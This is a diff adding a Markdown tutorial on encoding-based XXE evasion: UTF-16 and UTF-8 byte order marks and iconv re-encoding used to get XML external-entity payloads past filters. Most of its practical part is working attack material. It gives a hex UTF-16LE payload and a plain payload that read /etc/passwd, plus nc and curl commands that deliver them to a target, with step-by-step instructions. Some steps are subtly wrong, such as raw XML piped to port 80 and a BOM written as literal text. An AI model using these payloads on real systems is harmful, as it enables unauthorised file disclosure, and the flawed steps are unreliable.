@@ -1,0 +1,104 @@
+---
+title: Understanding Character Encoding Bypasses
+description: Explore techniques for character encoding bypasses to evade security
+  and trigger XXE payloads.
+keywords:
+- character encoding bypass
+- XML parsers
+- XXE payload
+- UTF-16
+- byte order mark
+- charset manipulation
+- ISO-8859-1 evasion
+- multibyte encoding
+- security evasion
+- encoding conversion
+---
+
+# Character Encoding Bypasses
+
+## Context
+
+Character encoding bypasses in XML parsers are advanced evasion techniques employed by attackers to manipulate encoding formats and bypass security filters or defenses. This exploitation strategy is primarily used to deliver XML External Entity (XXE) payloads while evading detection. To understand this concept, the reader should have foundational knowledge of character encodings such as UTF-8 and UTF-16, be familiar with XML structure and syntax, and know how to manipulate HTTP headers and perform standard XXE attacks.
+
+## Theory
+
+### Encoding Evasion in XML Parsers
+
+Character encoding bypasses exploit the way XML parsers interpret document encoding. This can trick the parsers into evading security controls designed to filter malicious content. XML parsers can sometimes misinterpret or inconsistently enforce encoding schemes, allowing malicious payloads to bypass security measures. Often, security controls assume XML documents use UTF-8 encoding, leaving them vulnerable to alternate encodings such as UTF-16, which they may not properly sanitize.
+
+### Byte Order Mark (BOM) and Encoding Switching
+
+A Byte Order Mark (BOM) is a special marker at the beginning of a text stream that indicates the encoding format, such as UTF-16LE or UTF-8. Attackers can exploit this by crafting XML payloads with a BOM or encoding declaration to force parsers to interpret the payloads differently. Some XML parsers prioritize BOM or XML prolog encoding declarations over HTTP headers, leading to inconsistent parsing and vulnerability to encoding-based attacks.
+
+### Multibyte and Non-Standard Encodings
+
+Multibyte encodings, such as UTF-16 and UTF-7, use more than one byte to represent a character, which complicates filtering and validation processes. Filters designed for single-byte encodings might not detect malicious entities embedded in multibyte character streams. Furthermore, parser libraries might fail to normalize or validate input consistently across all supported encodings, allowing for sophisticated bypass techniques.
+
+### Encoding Manipulation Tools and Techniques
+
+Attackers can use tools like **iconv** and **recode** to convert payloads into alternate encodings for evasion. By encoding payloads in a non-default charset, attackers can submit them to the target system to bypass straightforward input validation checks.
+
+## Practice
+
+### UTF-16 BOM Bypass for XXE
+
+To execute a UTF-16 BOM bypass, follow these steps:
+
+- Craft an XML payload that includes a UTF-16LE BOM and an XXE entity designed to bypass UTF-8-only filters.
+  
+  **Payload in Hex**
+  ```text
+  FF FE 3C 00 3F 00 78 00 6D 00 6C 00 20 00 76 00 65 00 72 00 73 00 69 00 6F 00 6E 00 3D 00 22 00 31 00 2E 00 30 00 22 00 3F 00 3E 00 0A 00 3C 00 21 00 44 00 4F 00 43 00 54 00 59 00 50 00 45 00 20 00 78 00 78 00 65 00 20 00 5B 00 0A 00 3C 00 21 00 45 00 4E 00 54 00 49 00 54 00 59 00 20 00 78 00 78 00 65 00 20 00 53 00 59 00 53 00 54 00 45 00 4D 00 20 00 22 00 66 00 69 00 6C 00 65 00 22 00 20 00 22 00 2F 00 65 00 74 00 63 00 2F 00 70 00 61 00 73 00 73 00 77 00 64 00 22 00 3E 00 0A 00 5D 00 3E 00 0A 00 3C 00 72 00 6F 00 6F 00 74 00 3E 00 26 00 78 00 78 00 65 00 3B 00 3C 00 2F 00 72 00 6F 00 6F 00 74 00 3E 00
+  ```
+
+- Send the crafted payload to the vulnerable server:
+  
+  ```bash
+  cat payload.xml | nc target.host 80
+  ```
+
+Outcome: This technique successfully processes the XXE payload despite input filters expecting UTF-8, thus bypassing input validation.
+
+### UTF-8 BOM Evasion
+
+To perform a UTF-8 BOM evasion:
+
+- Prepend a UTF-8 BOM to an XXE XML payload, which tricks some parsers to ignore filters when BOM is present.
+  
+  **Payload**
+  ```xml
+  EF BB BF<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+  ```
+
+- Send the BOM-prefixed payload to the target:
+  
+  ```bash
+  echo -e '\xEF\xBB\xBF<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' | curl -X POST -d @- http://target.host/upload
+  ```
+
+Outcome: The XXE payload is processed and bypasses filters that are not designed to handle BOM-prefixed input.
+
+### Encoding Conversion with iconv
+
+To convert encoding using **iconv**:
+
+- Convert a standard XXE payload to UTF-16BE:
+
+  ```bash
+  iconv -f UTF-8 -t UTF-16BE xxe.xml > xxe-utf16be.xml
+  ```
+
+- Send the converted payload to the target server:
+
+  ```bash
+  cat xxe-utf16be.xml | nc target.host 80
+  ```
+
+Outcome: The payload in alternate encoding bypasses security filters expecting default or single-byte encoding inputs.
+
+## Tools
+
+- **iconv**
+- **curl**
+- **nc**
